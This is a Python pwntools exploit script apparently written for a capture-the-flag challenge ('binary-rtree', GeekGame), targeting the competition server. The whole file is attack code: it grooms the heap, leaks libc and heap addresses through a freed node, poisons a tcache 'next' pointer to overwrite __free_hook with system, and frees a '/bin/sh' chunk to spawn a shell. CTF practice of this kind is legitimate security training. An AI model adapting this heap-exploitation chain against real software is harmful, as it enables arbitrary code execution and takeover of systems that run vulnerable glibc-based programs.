import sys
import pwn

def byte2int(b: bytes):
	return int.from_bytes(b, 'little')

def int2byte(i: int, length: int = 8):
	return i.to_bytes(length, 'little')

pwn.context.log_level = 'debug'
# r = pwn.process('./rtree') # , env={'LD_PRELOAD': '/home/intlsy/桌面/杂七杂八/241012-GeekGame/binary-rtree/lv3/malloc-hack.so'}
r = pwn.remote('prob14.geekgame.pku.edu.cn', 10014)
r.recvuntil(b'Please input your token:')
r.sendline(b'<token>')


def insert(key: int, size: int = 8, data: bytes = b'.'*8):
	assert len(data) == size
	r.recvuntil(b'5. exit')
	r.sendline(b'1')

	r.recvuntil(b'please enter the node key')
	r.sendline(str(key).encode())

	r.recvuntil(b'please enter the size of the data')
	r.sendline(str(size).encode())

	r.recvuntil(b'please enter the data')
	r.sendline(data)

def show(key: int):
	r.recvuntil(b'5. exit')
	r.sendline(b'2')

	r.recvuntil(b'please enter the key of the node you want to show')
	r.sendline(str(key).encode())
	
	r.recvuntil(b'\nthe data of the node is: \n')
	data = r.recvuntil(b'welcome to the Tree of Pwn', drop=True)
	return data

def remove(key: int):
	r.recvuntil(b'5. exit')
	r.sendline(b'3')

	r.recvuntil(b'please enter the key of the node you want to remove')
	r.sendline(str(key).encode())

def edit(key: int, data: bytes):
	r.recvuntil(b'5. exit')
	r.sendline(b'4')

	r.recvuntil(b'please enter the key of the node you want to change its data')
	r.sendline(str(key).encode())

	r.recvuntil(b'please enter the new data')
	r.sendline(data)

def edit_heap(offset: int, data: bytes):
	orig_data = show(0)
	new_data = orig_data[:offset] + data + orig_data[offset+len(data):]
	# print(new_data)
	edit(0, new_data)

libc = pwn.ELF('./libc-2.31.so')

# The root
insert(10)

M = 0x80
insert(101, M, b'\x11'*M)
insert(102, M, b'\x22'*M)
insert(103, M, b'\x33'*M)
insert(104, M, b'\x44'*M)
insert(105, M, b'\x55'*M)
insert(106, M, b'\x66'*M)
insert(107, M, b'\x77'*M)
insert(108, M, b'A'*M)
insert(109, M, b'\x88'*M)

remove(107)
remove(106)
remove(105)
remove(104)
remove(103)
remove(102)
remove(101)

insert(201, 0x8, b'\x01'*0x8)
insert(202, 0x8, b'\x02'*0x8)
insert(203, 0x8, b'\x03'*0x8)
insert(204, 0x8, b'\x04'*0x8)
insert(205, 0x8, b'\x05'*0x8)
insert(206, 0x8, b'\x06'*0x8)
insert(207, 0x8, b'\x07'*0x8)
insert(208, 0x8, b'\x07'*0x8)
insert(209, 0x8, b'\x07'*0x8)
insert(210, 0x8, b'\x07'*0x8)
insert(211, 0x8, b'\x07'*0x8)
insert(212, 0x8, b'\x07'*0x8)

# The one we will use to modify its "next"
insert(213, 0x60, b'P'*0x60)
insert(214, 0x60, b'R'*0x60)
remove(214)
remove(213)	# 0x60 -> 213 -> 214, we will modify the "next" of #213 to __free_hook

insert(301, 0x8, b'\x07'*0x8)
insert(302, 0x8, b'\x07'*0x8)
insert(303, 0x8, b'\x07'*0x8)

# The victim
insert(0, 0xe00, b'\x44'*0xe00)

# sys.exit(0)

# Prevent node #0's chunk from being merged into "wild"
HEAP_DUMP_SIZE = 0xa00
insert(13, HEAP_DUMP_SIZE, b'sh\x00\x00'*(HEAP_DUMP_SIZE//4))

# Make 0->eq not null
insert(0)

# Every "node creation" should be placed before this line
# And there should be no nodes in tcache for size = node size
remove(0)
# Now node 0 should have "data = heap base" and "key = 0".
# And node 0's data should be handled back to the unsorted bin

remove(108)

heap = show(0)
print(heap)
# sys.exit(0)

libc_addr_index = heap.find(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
libc_base = byte2int(heap[libc_addr_index-8:libc_addr_index])
system_addr = 0x7ffff7e27290-0x7ffff7fc1be0+libc_base
bin_sh_addr = 0x7ffff7f895bd-0x7ffff7fc1be0+libc_base
free_hook_addr = 0x7ffff7fc3e48-0x7ffff7fc1be0+libc_base

edit_heap(heap.find(b'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP')-16, int2byte(free_hook_addr))

insert(215, 0x60, b'/bin/sh\x00' + b'Q'*(0x60-0x8))	# Should be placed on the same place as #213, while changing tcache[0x60] to our desired address
insert(214, 0x60, int2byte(system_addr) + b'Q'*(0x60-0x8))	# Should be placed on `free_hook_addr`

remove(215)

r.interactive()
